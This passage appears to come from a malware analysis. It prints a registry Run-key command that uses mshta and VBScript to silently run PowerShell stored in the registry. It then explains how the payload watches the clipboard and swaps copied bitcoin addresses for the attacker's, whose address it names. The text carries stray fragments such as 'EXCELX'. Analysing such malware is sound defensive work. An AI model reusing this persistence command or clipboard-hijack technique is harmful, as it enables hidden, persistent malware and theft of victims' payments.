
To do so, it executes the following code. MicrosoftWINdows.
RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\replcia\", \"mshta vbscript:Execute(\"\"CreateObject(\"\"\"\"Wscript.
Shell\"\"\"\").Run \"\"\"\"powershell ((gp HKCU:\\Software).nasdnasndnad)|IEX\"\"\"\", 0 : window.close\"\")\", EXCELX Going through the PowerShell code we can see it performs a bitcoin address hijack.
It does this by continually detecting the data on the system clipboard.
If it’s a valid bitcoin address, it replaces the bitcoin address with attacker’s.
To do so it uses a “while” statement and a function to check if a string is a valid bitcoin address.
The while statement reads the system clipboard data from time to time by calling Get-Clipboard().
It then calls the function isBitcoinAddress() to determine if the data is a valid bitcoin address.
If so, it then calls Set-Clipboard() to modify the bitcoin address in the clipboard to the attacker’s, which in this case is “ 19VFGWgBkn6J3kMd8ApfCbtbNUmg8eBMvp ”.
  Figure 3.3 shows the PowerShell code used to hijack a bitcoin address.
Usually, people use the system clipboard to copy or paste the payee’s bitcoin address to make a payment.
During this time, this bitcoin hijack will change the payee’s bitcoin address to attacker’s.
The victim remains unaware that he/she paid their bitcoins to the wrong payee.